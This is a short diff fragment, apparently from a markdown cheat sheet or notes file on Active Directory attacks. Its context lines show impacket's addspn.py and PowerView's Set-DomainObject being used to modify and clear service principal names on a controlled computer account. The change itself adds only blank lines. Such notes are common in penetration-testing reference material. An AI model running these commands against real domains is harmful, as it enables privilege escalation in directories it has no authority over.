@@ -17,3 +17,5 @@ impacket@linux> addspn.py -u 'domain\user' -p 'password' -t 'ControlledComputer$
 powershell@windows> . .\Powerview.ps1
 powershell@windows> Set-DomainObject "CN=ControlledComputer,CN=Computers,DC=domain,DC=local" -Clear 'serviceprincipalname' -Verbose
 ```
+
+
